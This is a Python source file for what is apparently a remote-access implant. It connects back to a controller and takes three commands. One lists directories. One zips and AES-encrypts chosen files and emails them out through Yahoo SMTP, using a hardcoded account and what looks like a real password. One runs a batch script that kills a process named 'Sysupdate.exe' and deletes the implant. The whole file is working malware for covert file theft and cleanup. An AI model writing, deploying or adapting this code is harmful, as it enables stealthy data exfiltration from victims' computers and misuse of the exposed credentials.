import socket
import subprocess
import os
import zipfile
import os
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from Cryptodome.Cipher import AES
import time
from Cryptodome import Random
import  shutil

KEY = '0000000000000000'.encode('utf-8')
IV = b'0000000000000000'  #aes key


class AES_ENCRYPT():
    def __init__(self):
        self.aes = AES.new(KEY, AES.MODE_CBC, IV)

    # encrypt
    def encrypt(self, bytes):
        add = 16 - len(bytes) % 16
        add %= 16

        bytes += (b'\0' * add)

        return self.aes.encrypt(bytes)
        # return type bytes
    # decrypt
    def decrypt(self, bytes):
        bytes = self.aes.decrypt(bytes)
        return bytes.strip(b'\0')

MyAES = AES_ENCRYPT()

def encrypt_file(allfilename,outputpath):
    '''encrypt file to send'''
    with open(allfilename, 'rb') as bin:
        bindata = bin.read()
        en_str = MyAES.encrypt(bindata)
        with open(outputpath + "log.txt", 'wb') as out:
            out.write(en_str)
    #os.remove(allfilename)

def decrypt_file(allfilename):
    with open(allfilename, 'rb') as bin:
        bindata = bin.read()
        en_str = MyAES.decrypt(bindata)
        with open(allfilename[:-4], 'wb') as out:
            out.write(en_str)
def zipDir(dirpath, outFullName):
    '''compress'''
    zip = zipfile.ZipFile(outFullName, 'w', zipfile.ZIP_DEFLATED)
    for path, dirnames, filenames in os.walk(dirpath):
        this_path = os.path.abspath('build/590')
        fpath = path.replace(this_path, '')
        for filename in filenames:
            zip.write(os.path.join(path, filename), os.path.join(fpath, filename))
    zip.close()
def server_pre(msg):
    '''smtp server'''
    server = smtplib.SMTP('smtp.mail.yahoo.com',587)
    server.starttls()
    fromAddr = 'ybybj@yahoo.com'  #
    myPass = 'sfbygeovkialollo'  #
    server.login(fromAddr, myPass)
    server.send_message(msg)
    server.quit()

def send_listing(path):
    '''send mail'''
    global msg_list
    msg_list = MIMEMultipart()
    msg_list['From'] = 'ybybj@yahoo.com'
    msg_list['To'] = 'ybybj@yahoo.com'
    msg_list['Subject'] = 'file'
    body = 'file'
    msg_list.attach(MIMEText(body))
    with open(path,'rb') as f:
        mime = MIMEBase('txt','txt',filename='log.txt')
        mime.add_header('Content-Disposition','attachment',filename=('log.txt'))
        mime.add_header('Content-ID','<0>')
        mime.add_header('X-Attachment-Id','0')
        mime.set_payload(f.read())
        encoders.encode_base64(mime)
        msg_list.attach(mime)
    server_pre(msg_list)
    print(">>>Mail has been sent！")
def run_client(addr):
     '''receive cmd execute'''
     #try:
     while True:
            try:
                c = socket.socket()
                c.connect(addr)
                cmd = c.recv(1024)
                cmd = cmd.decode("utf-8")
                print(cmd)
                #cmd = repr(cmd)
                # print("incomming command: " + cmd)
                # ops = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                # output = ops.stdout.read().decode(FORMAT)
                # err = ops.stderr.read().decode(FORMAT)
                # send target returned msg
                # output = output.decode(FORMAT)

                if cmd.split()[0] == "list":
                    '''query file list'''
                    path = cmd[5:]
                    msg = ','.join(os.listdir(path))

                elif cmd.split()[0] == "send":
                    '''send file'''
                    path = cmd[5:]
                    #path = repr(path)
                    if (os.path.isdir(path)):
                        outpath = os.getcwd()+"log.zip"
                        zipDir(path, outpath)
                        #msg = "zip"
                        #msg = msg.encode("utf-8")
                        #c.send(msg)
                        encrypt_file(outpath,os.getcwd())
                        os.remove(outpath)
                        outpath = os.getcwd()+"log.txt"
                        send_listing(outpath)
                        os.remove(outpath)
                        msg = 'mail sent'
                    elif (os.path.isfile(path)):
                        encrypt_file(path,os.getcwd())
                        outpath = os.getcwd() + "log.txt"
                        send_listing(outpath)
                        os.remove(outpath)
                        msg = 'mail sent'
                    else:
                        msg = 'error'
                elif cmd.split()[0] == "delimplant":
                    '''delete implant'''
                    path = cmd[11:]
                    ss =f"taskkill /f /t /im Sysupdate.exe\ndel /F /S /Q \"{path}\"\ndel %0"
                    #print(ss)
                    # c.send(msg)
                    # c.close()
                    # os.system('%s%s' % ("taskkill /F /IM ","590.exe"))
                    # os.remove(path)
                    with open("1.bat", 'w+') as out:
                        out.write(ss)
                    #os.system("1.bat")
                    os.system("start powershell.exe cmd /c '1.bat'")
                    msg = "del"
                    msg = msg.encode("utf-8")
                    #self_path = os.path.abspath(__file__)
                    #os.remove(self_path)
                    #shutil.rmtree(self_path[:-6])
                else:
                    msg = 'error'
                msg = msg.encode("utf-8")
                c.send(msg)
                c.close()
            except:
                time.sleep(600)
     # except :
     #    print("end client")
     #    print("deleting")
        #self_path = os.path.abspath(__file__)
        #os.remove(self_path)
if __name__ == '__main__':
    ADDR = ('192.168.56.188',8888)
    run_client(ADDR)